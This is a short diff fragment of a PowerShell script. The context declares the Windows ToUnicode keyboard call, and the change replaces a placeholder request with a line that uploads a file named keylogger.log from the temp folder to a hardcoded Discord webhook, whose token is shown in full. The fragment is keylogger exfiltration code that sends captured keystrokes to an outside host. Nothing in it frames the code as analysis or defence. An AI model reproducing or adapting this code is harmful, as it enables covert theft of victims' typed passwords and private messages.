@@ -59,10 +59,8 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 
 $webhookUri = 'https://discord.com/api/webhooks/938865371790843925/0iTYBgzJrUrvRtC2Jr7etORt93ZtueTNOQ0D0PDxI8iWsa58l0rznZ61VJ50ivrhVGUe'
 
-$Body = @{
-  'caca'
-}
-Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body
+
+Invoke-RestMethod -Uri $webhookUri -Method 'post' -InFile "$env:temp/keylogger.log"
   }
 }
 
